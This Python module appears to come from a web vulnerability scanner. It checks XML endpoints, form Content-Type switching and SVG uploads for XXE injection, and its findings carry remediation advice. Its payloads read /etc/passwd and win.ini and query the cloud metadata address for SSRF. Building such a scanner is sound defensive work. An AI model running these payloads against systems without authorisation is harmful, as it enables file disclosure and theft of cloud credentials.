import re
from urllib.parse import urlparse

from scanner.core import Finding, Severity, ScanSession, build_curl
from scanner.log import logger

XXE_PAYLOADS = [
    {
        "name": "File Read (Linux)",
        "payload": '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
        "indicator": r"root:[x*]:0:0:",
        "severity": Severity.CRITICAL,
        "validate": "passwd",
    },
    {
        "name": "File Read (Windows)",
        "payload": '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/windows/win.ini">]><root>&xxe;</root>',
        "indicator": r"\[fonts\]",
        "severity": Severity.CRITICAL,
        "validate": "winini",
    },
    {
        "name": "SSRF via XXE",
        "payload": '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>',
        "indicator": r"ami-id|instance-id|local-hostname",
        "severity": Severity.CRITICAL,
        "validate": None,
    },
]

XXE_REFERENCES = (
    "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing | "
    "https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html | "
    "https://cwe.mitre.org/data/definitions/611.html"
)

XXE_DETECTION = (
    "Submitted XML payloads with external entity declarations referencing "
    "/etc/passwd or internal URLs via POST. Confirmed when resolved content "
    "appears in the response."
)


def _validate_match(text: str, validate_type: str | None) -> bool:
    if validate_type == "passwd":
        lines = [l for l in text.split("\n") if re.match(r"^[a-z_][\w-]*:[^:]*:\d+:\d+:", l)]
        return len(lines) >= 3
    if validate_type == "winini":
        return "[fonts]" in text.lower() and "[extensions]" in text.lower()
    return True


def _is_xml_endpoint(resp) -> bool:
    ct = resp.headers.get("Content-Type", "").lower()
    return any(x in ct for x in ("application/xml", "text/xml", "application/soap+xml")) or resp.text.lstrip()[:5] == "<?xml"


def _extract_snippet(text: str, indicator: str, context_chars: int = 80) -> str:
    match = re.search(indicator, text, re.IGNORECASE)
    if not match:
        return ""
    start = max(0, match.start() - context_chars)
    end = min(len(text), match.end() + context_chars)
    return text[start:end].replace('\n', ' ').strip()


def _report_xxe(session, entry, url, resp, snippet, extra_desc="", extra_evidence="", location_suffix=""):
    """Shared finding builder for all XXE vectors."""
    parsed = urlparse(url)
    headers = {"Content-Type": "application/xml"}
    location = "XML parsing endpoint at {}".format(parsed.path) + location_suffix

    session.add_finding(Finding(
        title="XML External Entity (XXE): {}".format(entry["name"]),
        severity=entry["severity"],
        description=(
            "The endpoint at {} processes external entity declarations without "
            "restriction. An attacker can perform {} by injecting a crafted DOCTYPE. "
            "The parser resolved the entity and included it in the response.{}" .format(
                url, entry["name"].lower(), " " + extra_desc if extra_desc else "")
        ),
        evidence=(
            "Payload Type: {}\nTarget URL: {}\nPayload: {}\n"
            "Indicator: {}\nSnippet: ...{}...\nStatus: {}{}".format(
                entry["name"], url, entry["payload"], entry["indicator"],
                snippet, resp.status_code,
                "\n" + extra_evidence if extra_evidence else "")
        ),
        remediation=(
            "1. Disable DTD processing entirely in the XML parser.\n"
            "2. Disable external entity resolution (SYSTEM/PUBLIC).\n"
            "3. Use JSON where possible.\n"
            "4. Upgrade XML processor libraries.\n"
            "5. Reject DOCTYPE declarations in input validation."
        ),
        url=url,
        module="xxe",
        cwe="CWE-611",
        confirmed=True,
        location=location,
        parameter="HTTP request body (raw XML)",
        payload=entry["payload"],
        request_method="POST",
        request_headers="Content-Type: application/xml",
        request_body=entry["payload"],
        response_status=resp.status_code,
        curl_command=build_curl("POST", url, headers=headers, data=entry["payload"]),
        reproduction_steps=(
            "1. Identify XML endpoint at: {}\n"
            "2. Send POST with Content-Type: application/xml:\n   {}\n"
            "3. Observe resolved entity content (matched: {}).".format(
                url, entry["payload"], entry["indicator"])
        ),
        developer_fix=(
            "Disable external entity processing in the XML parser:\n"
            "  Python (lxml): parser = etree.XMLParser(resolve_entities=False, no_network=True)\n"
            "  Python: use defusedxml.ElementTree\n"
            "  Java: factory.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true)\n"
            "  PHP: libxml_disable_entity_loader(true)\n"
            "  .NET: XmlReaderSettings.DtdProcessing = DtdProcessing.Prohibit"
        ),
        affected_component="XML parser at {}".format(parsed.path),
        references=XXE_REFERENCES,
        detection_method=XXE_DETECTION,
    ))


def _check_xml_endpoints(session: ScanSession):
    for url in session.crawled_urls:
        resp = session.get(url)
        if not resp or not _is_xml_endpoint(resp):
            continue

        baseline_text = resp.text
        parsed = urlparse(url)

        for entry in XXE_PAYLOADS:
            test_resp = session.post(url, data=entry["payload"], headers={"Content-Type": "application/xml"})
            if not test_resp or test_resp.status_code in (404, 403, 405):
                continue
            if not re.search(entry["indicator"], test_resp.text, re.IGNORECASE):
                continue
            if re.search(entry["indicator"], baseline_text, re.IGNORECASE):
                continue
            if not _validate_match(test_resp.text, entry.get("validate")):
                continue

            _report_xxe(session, entry, url, test_resp,
                        _extract_snippet(test_resp.text, entry["indicator"]))
            return


def _check_content_type_switch(session: ScanSession):
    for form in session.forms:
        if form["method"] != "post":
            continue

        baseline_data = {inp["name"]: inp.get("value", "test") for inp in form["inputs"] if inp.get("name")}
        baseline_resp = session.post(form["action"], data=baseline_data)
        baseline_text = baseline_resp.text if baseline_resp else ""

        source_url = form.get("source_url", form["action"])
        input_names = [i.get("name", "") for i in form["inputs"] if i.get("name")]

        for entry in XXE_PAYLOADS[:2]:
            resp = session.post(form["action"], data=entry["payload"], headers={"Content-Type": "application/xml"})
            if not resp or resp.status_code in (404, 403, 405, 415):
                continue
            if not re.search(entry["indicator"], resp.text, re.IGNORECASE):
                continue
            if re.search(entry["indicator"], baseline_text, re.IGNORECASE):
                continue
            if not _validate_match(resp.text, entry.get("validate")):
                continue

            snippet = _extract_snippet(resp.text, entry["indicator"])
            extra_evidence = "Original Form Fields: {}\nContent-Type switched from form-encoded to XML".format(
                ", ".join(input_names))

            _report_xxe(session, entry, form["action"], resp, snippet,
                        extra_desc="The server accepted XML on a form endpoint without Content-Type validation.",
                        extra_evidence=extra_evidence,
                        location_suffix=" (Content-Type switch)")
            return


def _check_file_upload_xxe(session: ScanSession):
    svg_xxe = (
        '<?xml version="1.0" encoding="UTF-8"?>'
        '<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
        '<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">'
        '<text x="0" y="20">&xxe;</text></svg>'
    )

    for form in session.forms:
        if not any(inp.get("type") == "file" for inp in form["inputs"]):
            continue

        for inp in form["inputs"]:
            if inp.get("type") != "file":
                continue

            name = inp.get("name", "file")
            files = {name: ("test.svg", svg_xxe, "image/svg+xml")}
            other_data = {
                o.get("name"): o.get("value", "test")
                for o in form["inputs"] if o.get("name") and o.get("type") != "file"
            }

            resp = session.post(form["action"], files=files, data=other_data)
            if not resp or resp.status_code in (404, 403):
                continue

            if not re.search(r"root:[x*]:0:0:", resp.text):
                continue
            lines = [l for l in resp.text.split("\n") if re.match(r"^[a-z_][\w-]*:[^:]*:\d+:\d+:", l)]
            if len(lines) < 3:
                continue

            source_url = form.get("source_url", form["action"])
            parsed = urlparse(form["action"])
            snippet = _extract_snippet(resp.text, r"root:[x*]:0:0:")
            other_data_str = "&".join("{}={}".format(k, v) for k, v in other_data.items())

            session.add_finding(Finding(
                title="XXE via SVG File Upload",
                severity=Severity.CRITICAL,
                description=(
                    "The upload endpoint at {} accepts SVG files and processes "
                    "embedded XML without disabling external entity resolution. "
                    "A crafted SVG with a DOCTYPE referencing file:///etc/passwd "
                    "returned the file contents.".format(form["action"])
                ),
                evidence=(
                    "Upload Endpoint: {}\nFile Field: {}\nFilename: test.svg\n"
                    "SVG Payload: {}...\nPasswd Lines: {}\n"
                    "Snippet: ...{}...\nStatus: {}".format(
                        form["action"], name, svg_xxe[:120], len(lines), snippet, resp.status_code)
                ),
                remediation=(
                    "1. Strip DOCTYPE declarations from uploaded SVG/XML.\n"
                    "2. Sanitize SVGs with DOMPurify (server-side).\n"
                    "3. Disable external entities in the XML parser.\n"
                    "4. Validate uploads by content, not just extension/MIME.\n"
                    "5. Consider converting SVGs to PNG on upload."
                ),
                url=source_url,
                module="xxe",
                cwe="CWE-611",
                confirmed=True,
                location="File upload field '{}' at {}".format(name, parsed.path),
                parameter=name,
                payload=svg_xxe,
                request_method="POST",
                request_headers="Content-Type: multipart/form-data",
                request_body="File '{}' = test.svg (malicious SVG){}".format(
                    name, "; " + other_data_str if other_data_str else ""),
                response_status=resp.status_code,
                curl_command=build_curl("POST", form["action"], files=files,
                                        data=other_data_str if other_data_str else None),
                reproduction_steps=(
                    "1. Navigate to: {}\n"
                    "2. Create test.svg with XXE payload\n"
                    "3. Upload via '{}' field to: {}\n"
                    "4. Observe /etc/passwd contents in response.".format(
                        source_url, name, form["action"])
                ),
                developer_fix=(
                    "Sanitize SVG uploads before processing:\n"
                    "  Python: defusedxml.ElementTree or etree.XMLParser(resolve_entities=False)\n"
                    "  Node.js: DOMPurify.sanitize(svg, {{ USE_PROFILES: {{ svg: true }} }})\n"
                    "  Fallback: re.sub(r'<!DOCTYPE[^>]*>', '', svg_content)"
                ),
                affected_component="POST {} - SVG upload processing for '{}'".format(form["action"], name),
                references=(
                    XXE_REFERENCES + " | "
                    "https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload"
                ),
                detection_method=XXE_DETECTION,
            ))
            return


def run(session: ScanSession) -> None:
    logger.info("\n[*] Testing for XML External Entity (XXE) Injection...")
    _check_xml_endpoints(session)
    _check_content_type_switch(session)
    _check_file_upload_xxe(session)
